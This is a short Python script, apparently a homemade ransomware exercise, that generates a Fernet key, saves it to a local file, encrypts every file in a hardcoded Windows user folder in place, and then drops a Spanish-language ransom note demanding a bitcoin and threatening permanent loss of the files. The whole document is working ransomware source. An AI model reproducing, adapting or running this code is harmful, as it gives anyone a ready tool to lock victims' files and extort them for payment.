from cryptography.fernet import Fernet
import os


def createKey():
    key=Fernet.generate_key()
    with open("myKey","wb") as keyFile:
        keyFile.write(key)

def returnKey():
    with open("myKey","rb") as keyFile:
        key =keyFile.read()
    return key

def encryp(items, key):
    f=Fernet(key)
    for x in items:
        with open(x,"rb") as file:
            fileData=file.read()
        data=f.encrypt(fileData)
        with open(x,"wb")as file:
            file.write(data)

if __name__=="__main__":
    myData='C:\\Users\\kibok\\OneDrive\\Desktop\\Liss\\Ransomware2\\Archivos'
    items=os.listdir(myData)
    myDataSave=[os.path.join(myData,x) for x in items]

    createKey()

    key=returnKey()
    encryp(myDataSave,key)

    with open(os.path.join(myData,"readme.txt"),"w")as file:
        file.write("Tus archivos estan secuestrados\n")
        file.write("Para rescatarlos transfiere un bit-coin ")
        file.write("Si no lo hace e intenta recuperarlos, perdera para siempre")

